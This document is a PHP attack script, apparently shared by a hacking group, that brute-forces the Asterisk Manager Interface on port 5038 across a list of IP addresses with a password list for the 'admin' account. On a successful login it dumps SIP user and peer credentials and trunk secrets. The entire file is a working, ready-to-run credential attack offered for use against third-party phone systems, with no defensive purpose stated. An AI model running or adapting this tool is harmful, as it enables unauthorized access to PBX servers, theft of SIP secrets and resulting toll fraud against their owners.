<?php
/*

 By oM3Ga >> Kj

 Join HackTeach Facebook Group For More:
 https://www.facebook.com/groups/hackteach.org/

 Nmap download links:
 rpm -vhU https://nmap.org/dist/nmap-7.40-1.x86_64.rpm
 rpm -vhU https://nmap.org/dist/nmap-7.40-1.i686.rpm

*/
	echo "
    ########################################################################
    #  _______                .___                                         #
    #  \   _  \             __| _/____  ___.__.   *  VOIP 0-Days           #
    #  /  /_\  \   ______  / __ |\__  \<   |  |                            #
    #  \  \_/   \ /_____/ / /_/ | / __ \ \___ |                            #
    #   \_____  /         \____ |(____  / ____|                            #
    #         \/               \/     \/\/                                 #
    #       * Asterisk Manager Interface (AMI) BruteForce  (Only PBX)      #
    #       * By    : oM3Ga <Kj>                                           #
    #       * Home  : https://www.facebook.com/groups/hackteach.org/       #
    #       * Usage : ./go ips.txt                                         #
    #       * Usage2: php $argv[0] ips.txt pass.txt                         #
    #       * Priv8 Script Plz Don't Share! Enjoy ;)                       #
    #                                                                      #
    ########################################################################
	";
error_reporting(0);
$succ="Response: Success";
$fail="Response: Error";
$end = "--END COMMAND--";
$ips = file($argv[1], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$passwords = file($argv[2], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (!isset($argv[1]) || !isset($argv[2]))
{
	die("\nUsage: php $argv[0] ips.txt pass.txt\r\n");
}
echo"Ok! Starting ! GOODLUCK..\r\n";
 foreach ($ips as $ip) {
  $ip = trim($ip);
echo"\r\nTrying $ip .. \r\n";
  foreach ($passwords as $pass) {
    $pass = trim($pass);
$oSocket = @fsockopen ($ip, 5038, $errno, $errstr, 5);
if (!$oSocket) {
echo "\r\nConnection Failed!\r\n";
} else {
fputs($oSocket, "Action: Login\r\n");
fputs($oSocket, "Username: admin\r\n");
fputs($oSocket, "Secret: $pass\r\n\r\n");

while ( $out = fgets($oSocket)) {
$out = trim($out);

if ( $out == $succ ) {
echo"Success!\r\n\r\nGetting Now SIP & Trunk Usernames and Secrets ..\r\n\r\n"; 
fputs($oSocket, "Action: command\r\n");
fputs($oSocket, "command: sip show users\r\n\r\n");
while ( $out1 = fgets($oSocket)) {
$out1 = trim($out1);
echo"$out1\r\n\r\n";
if ( $out1 == $end ) { 
echo "Getting Now SIP Peers! .. \r\n\r\n"; 
break; } }
fputs($oSocket, "Action: command\r\n");
fputs($oSocket, "command: sip show peers\r\n\r\n");
while ( $out2 = fgets($oSocket)) {
$out2 = trim($out2);
echo"$out2\r\n\r\n";
if ( $out2 == $end ) { 
echo "Done! Moving On .. \r\n\r\n"; 
break; } }
break; } 

elseif ($out == $fail ) {

echo"Failed!\r\n"; break; } } // on: $ips with $pass

fputs($oSocket, "Action: Logoff\r\n\r\n");
fclose($oSocket); 
} // if oScocket
} // foreach loop
} // 2nd foreach 
?>
